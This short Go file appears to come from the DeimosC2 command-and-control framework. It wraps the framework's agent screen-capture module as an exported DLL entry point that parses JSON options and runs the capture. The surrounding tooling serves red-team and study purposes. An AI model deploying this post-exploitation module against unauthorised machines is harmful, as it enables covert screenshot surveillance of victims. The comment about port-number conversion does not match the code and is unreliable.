package main

import (
	"C"

	"github.com/AdvancedThreatAnalytics/DeimosC2/modules/collection/agents/screengrab"
)
import "encoding/json"

func main() {
	args := screengrab.DllOptions{}
	args.Options[0] = "1234"
	screengrab.RunModule(args)
}

//export StartModule
//StartModule converts the string into a port number
func StartModule(data *C.char) {
	var passedOptions string
	if len(C.GoString(data)) > 0 {
		passedOptions = C.GoString(data)
	}
	options := screengrab.DllOptions{}
	json.Unmarshal([]byte(passedOptions), &options)
	screengrab.RunModule(options)
}
